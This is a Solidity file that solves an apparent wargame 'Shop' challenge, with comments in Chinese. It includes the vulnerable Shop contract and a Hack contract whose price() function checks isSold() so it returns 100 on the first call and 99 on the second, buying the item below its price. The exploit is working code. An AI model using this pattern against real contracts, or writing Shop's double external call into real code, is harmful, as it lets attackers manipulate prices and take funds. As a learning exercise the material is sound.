// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface Buyer {
  function price() external view returns (uint);//这个是我们攻击的点
}

contract Shop {
  uint public price = 100;
  bool public isSold;

  function buy() public {
    Buyer _buyer = Buyer(msg.sender);

    if (_buyer.price() >= price && !isSold) {
      isSold = true;
      price = _buyer.price();//可以看到这个合约当中调用了两次_buyer.price()
      //而题目的要求就是最终的_buyer.price()的返回值在第一次为100，第二次返回小于这个数字
    }
  }
}
contract Hack {
    Shop private immutable target;
    constructor(address _target) {
        target =Shop(_target);
    }
    function pwn() external{
        target.buy();

    }
    function price() external view returns(uint){
        /*如何判断是否是几次调用使得动态的满足条件呢第一次
        return 100;
        第二次return
        return 99;
        应该使用题目中的isSold（）状态来获得这个*/
        if(target.isSold())
        return 99;
        else
        return 100;
    }
    
}